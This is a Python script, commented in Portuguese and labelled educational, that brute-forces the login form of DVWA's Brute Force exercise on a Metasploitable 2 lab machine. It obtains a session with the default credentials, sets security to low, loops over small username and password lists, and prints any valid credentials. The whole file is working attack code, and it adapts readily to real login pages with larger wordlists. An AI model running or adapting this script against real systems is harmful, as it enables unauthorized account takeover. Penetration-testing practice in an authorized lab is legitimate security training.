#!/usr/bin/env python3
"""
Script educacional de teste de login (brute force) no DVWA Brute Force (Low)
Laboratório: Kali Linux (atacante) + Metasploitable 2 (alvo)
Uso apenas em ambiente controlado que você possui autorização.
"""

import requests
from urllib.parse import urljoin
import sys
import time

# ============================================================
# CONFIGURAÇÕES - Altere conforme seu laboratório
# ============================================================
TARGET_IP = "192.168.56.101"          # IP do Metasploitable 2 (descubra com nmap)
BASE_URL = f"http://{TARGET_IP}/dvwa/"
LOGIN_URL = urljoin(BASE_URL, "login.php")
BRUTE_URL = urljoin(BASE_URL, "vulnerabilities/brute/")

# Credenciais padrão do DVWA (para obter a sessão)
DVWA_USER = "admin"
DVWA_PASS = "password"

# Wordlists simples para demonstração (em produção use rockyou.txt etc.)
USERNAMES = ["admin", "msfadmin", "1337", "pablo", "smithy"]
PASSWORDS = ["password", "abc123", "charley", "msfadmin", "admin", "123456"]

# String que o PHP retorna em caso de FALHA (veja o código original)
FAIL_STRING = "Username and/or password incorrect."
# String que o PHP retorna em caso de SUCESSO
SUCCESS_STRING = "Welcome to the password protected area"

# ============================================================
# Função 1: Fazer login no DVWA e obter cookies de sessão
# ============================================================
def get_session():
    """
    Realiza o login principal no DVWA para obter o cookie PHPSESSID.
    Sem isso a página /vulnerabilities/brute/ redireciona para o login.
    """
    session = requests.Session()
    
    # 1. Pega a página de login (pode conter token em versões mais novas)
    r = session.get(LOGIN_URL)
    
    # 2. Envia o formulário de login (método POST)
    data = {
        "username": DVWA_USER,
        "password": DVWA_PASS,
        "Login": "Login"
    }
    r = session.post(LOGIN_URL, data=data)
    
    # 3. Define o nível de segurança como Low (cookie)
    session.cookies.set("security", "low")
    
    if "index.php" in r.url or "Welcome" in r.text or "logout" in r.text.lower():
        print("[+] Login no DVWA realizado com sucesso. Sessão obtida.")
        return session
    else:
        print("[-] Falha ao logar no DVWA. Verifique IP e se o banco foi criado (setup.php).")
        sys.exit(1)

# ============================================================
# Função 2: Testar um par usuário/senha no formulário vulnerável
# ============================================================
def test_login(session, username, password):
    """
    Envia a requisição GET exatamente como o formulário do DVWA Low faz.
    O PHP original espera:
        ?username=XXX&password=YYY&Login=Login
    """
    params = {
        "username": username,
        "password": password,
        "Login": "Login"          # botão de submit
    }
    
    try:
        response = session.get(BRUTE_URL, params=params, timeout=10)
        
        # Verifica a resposta do PHP
        if SUCCESS_STRING in response.text:
            return True, "SUCESSO"
        elif FAIL_STRING in response.text:
            return False, "FALHA"
        else:
            return False, "RESPOSTA INESPERADA"
            
    except requests.exceptions.RequestException as e:
        return False, f"ERRO DE REDE: {e}"

# ============================================================
# Função principal - brute force simples
# ============================================================
def main():
    print("=" * 60)
    print("  Teste de Login / Brute Force - DVWA (Low) - Educacional")
    print("  Alvo: Metasploitable 2 | Atacante: Kali")
    print("=" * 60)
    
    # Obtém a sessão autenticada
    session = get_session()
    
    print(f"\n[*] Iniciando testes em: {BRUTE_URL}")
    print(f"[*] Usando {len(USERNAMES)} usuários e {len(PASSWORDS)} senhas\n")
    
    found = []
    
    for user in USERNAMES:
        for pwd in PASSWORDS:
            print(f"[*] Testando → {user} : {pwd}", end=" ... ")
            
            success, msg = test_login(session, user, pwd)
            
            if success:
                print(f"\033[92m[+] CREDENCIAIS VÁLIDAS!\033[0m")
                found.append((user, pwd))
                # Em um ataque real você pararia aqui (ou continuaria para mapear todos)
            else:
                print(f"\033[91m[-] {msg}\033[0m")
            
            # O PHP original faz sleep(3) em caso de falha.
            # Em laboratório podemos deixar um delay pequeno para não sobrecarregar.
            time.sleep(0.3)
    
    print("\n" + "=" * 60)
    if found:
        print("[+] Credenciais encontradas:")
        for u, p in found:
            print(f"    → {u} / {p}")
    else:
        print("[-] Nenhuma credencial válida encontrada com as wordlists fornecidas.")
    print("=" * 60)

if __name__ == "__main__":
    main()
